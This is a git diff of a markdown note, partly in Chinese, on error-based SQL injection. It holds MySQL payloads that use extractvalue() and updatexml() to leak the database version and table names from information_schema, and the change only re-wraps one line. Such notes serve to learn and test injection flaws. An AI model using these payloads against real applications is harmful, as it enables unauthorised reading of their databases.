@@ -27,7 +27,8 @@ select version()可替换 select table_name from information_schema.tables where
 ```
 ####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Payload: and extractvalue(1, payload)
 ```sql
-and extractvalue(1, concat(0x7e,(select @@version),0x7e)) and updatexml(1,concat(0x23,(select table_name from information_schema.tables where table_schema='newblog' limit 0,1),0x23),1)
+and extractvalue(1, concat(0x7e,(select @@version),0x7e)) and updatexml(1,concat(0x23,(select table_name from
+information_schema.tables where table_schema='newblog' limit 0,1),0x23),1)
 ```
 ![](/assets/22F086091F949BB64B59D97865EFE310.png)
 ####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Payload: and updatexml(1,payload,1)
